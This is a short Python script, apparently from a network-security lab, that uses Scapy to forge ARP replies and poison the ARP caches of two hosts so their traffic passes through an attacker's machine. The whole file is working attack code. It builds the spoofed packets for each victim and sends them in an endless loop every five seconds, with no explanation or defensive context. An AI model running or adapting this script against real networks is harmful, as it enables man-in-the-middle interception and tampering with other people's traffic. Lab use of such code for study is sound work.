#!/usr/bin/env python3
from scapy.all import *
import time

#########################################################
# Code for poisoning A's ARP Cache

E1 = Ether()
A1 = ARP()

fake_MAC = "02:42:0a:09:00:69"      # Attacker's MAC
target_MAC_A = "02:42:0a:09:00:05"  # Host A's MAC
victim_IP_B = "10.9.0.6"            # Host B's IP
target_IP_A = "10.9.0.5"            # Host A's IP

# Poison A's cache
E1.src = fake_MAC
E1.dst = target_MAC_A               # Send directly to A

A1.psrc = victim_IP_B               # B's IP
A1.hwsrc = fake_MAC                 # Attacker's MAC
A1.pdst = target_IP_A               # A's IP (target)
A1.hwdst = target_MAC_A             # A's MAC
A1.op = 2                           # ARP reply

# Combine both the Ethernet and ARP packets
pkt1 = E1 / A1

##########################################################
# Code for poisoning B's ARP Cache

# Create Ethernet and ARP packets for poisoning B's cache
E2 = Ether()
A2 = ARP()

# Poison B's cache
E2.src = fake_MAC
E2.dst = "02:42:0a:09:00:06"        # Host B's MAC

A2.psrc = target_IP_A               # A's IP
A2.hwsrc = fake_MAC                 # Attacker's MAC
A2.pdst = victim_IP_B               # B's IP (target)
A2.hwdst = "02:42:0a:09:00:06"      # B's MAC
A2.op = 2                           # ARP reply

# Combine both the Ethernet and ARP packets
pkt2 = E2 / A2

# Continuously send ARP poisoning packets
while True:
    sendp(pkt1)
    sendp(pkt2)
    time.sleep(5)
